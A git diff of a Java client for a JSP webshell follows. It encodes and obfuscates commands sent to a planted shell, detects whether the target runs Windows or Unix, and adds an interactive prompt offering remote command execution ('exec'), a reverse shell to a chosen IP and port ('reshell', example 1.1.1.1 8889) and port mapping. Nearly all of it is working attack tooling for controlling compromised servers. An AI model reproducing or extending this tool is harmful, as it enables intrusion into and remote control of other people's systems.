@@ -17,13 +17,14 @@ public class Main {
 	public static String pass;
 	public static String key;
 	public static String words;
+	public static Encoder encoder;
 	public static void main(String[] args) {
 		
-		Encoder encoder=Base64.getEncoder();
+		encoder=Base64.getEncoder();
 		if (args.length==0) {
 			System.out.println("use age:");
 			System.out.println("java -jar client.jar http://localhost/a.jsp 密码   key words");
-			System.out.println("密码为shell的密码,key取值为（!@#$%^<>~?）,words为和key同等长度的（A-Za-z）");
+			System.out.println("密码为shell的密码,key取值为（!@#$^<>~?）,words为和key同等长度的（A-Za-z）");
 			System.out.println("java -jar client.jar g key words");
 			System.out.println("构造shell,满足key长度等于words");
 			return;
@@ -51,15 +52,14 @@ public class Main {
 			String unix=cmd.replace("%cmd%", "sh -c 'echo ok'");
 			String win_de=new String(encoder.encode(win.getBytes()));
 			String unix_de=new String(encoder.encode(unix.getBytes()));
-			for (int i = 0; i <key.length(); i++) {
-				win_de=win_de.replace(words.substring(i,i+1), key.substring(i,i+1));
-			}
-			for (int i = 0; i < key.length(); i++) {
-				unix_de=unix_de.replace(words.substring(i,i+1), key.substring(i,i+1));
-			}
-			
+			win_de=Util.EnChar(win_de, key, words);
+			unix_de=Util.EnChar(unix_de, key, words);
 			if (Util.GetStatuscode(pass,url, win_de, key, words)==200) {
-				System.out.println("win");
+				System.err.println("eg:");
+				System.out.println("exec [command]	//执行一个命令");
+				System.out.println("reshell [ip] [port] //反弹shell到指定端口");
+				System.out.println("portmap   //开启端口映射");
+				DoHome("win");
 				
 			}else if (Util.GetStatuscode(pass,url, unix_de, key, words)==200) {
 				System.out.println("unix");
@@ -73,7 +73,6 @@ public class Main {
 	}
 	public static void DoHome(String pfm) {
 		System.out.print("shell$");
-		
 		Scanner scanner=new Scanner(System.in);
 		List<String> list=new ArrayList<String>();
 		String input=scanner.nextLine();
@@ -83,11 +82,13 @@ public class Main {
 		}
 		switch (list.get(0)) {
 		case "exec":
-			if (list.size()==2) {
-				
+			if (list.size()>=2) {
+				String res=Util.DoCode(pfm,list);
+				System.out.println(res);
 			}else {
-				System.out.println("exec whoami");
+				System.out.println("eg:exec whoami");
 			}
+			Main.DoHome(pfm);
 			break;
 		case  "reshell":
 			if (list.size()==3) {
@@ -95,11 +96,13 @@ public class Main {
 			}else {
 				System.out.println("reshell 1.1.1.1 8889");
 			}
+			Main.DoHome(pfm);
 			break;
 		case "tgcd":
 			
 			break;
 		default:
+			Main.DoHome(pfm);
 			break;
 		}
 	}
